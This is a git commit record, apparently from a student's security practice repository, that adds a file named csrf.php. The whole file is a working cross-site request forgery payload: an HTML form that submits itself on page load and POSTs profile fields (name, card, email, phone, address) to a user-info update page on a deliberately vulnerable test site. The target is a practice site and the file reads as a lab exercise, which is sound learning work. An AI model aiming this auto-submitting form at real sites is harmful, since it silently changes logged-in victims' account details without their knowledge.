2db432fa00d8cf31a398d54106d7f1ede20d6016
sruthi <vsruthi98@gmail.com>
2018-11-09 18:24:49 +0530

    9th Nov

---
+++ 9thNov/csrf.php
@@ -0,0 +1,10 @@
+<body onload="document.getElementById('form1').submit()">
+  <form id="form1" action="http://testphp.vulnweb.com/userinfo.php" method="POST">
+    <input type="text" name="urname" value="OKAY DONE">
+    <input type="text" name="ucc" value="123456">
+    <input type="text" name="uemail" value="some emaillllll">
+    <input type="text" name="uphone" value="1234567890">
+    <input type="text" name="uaddress" value="sectionf">
+    <input type="text" name="update" value="update">
+  </form>
+</body>
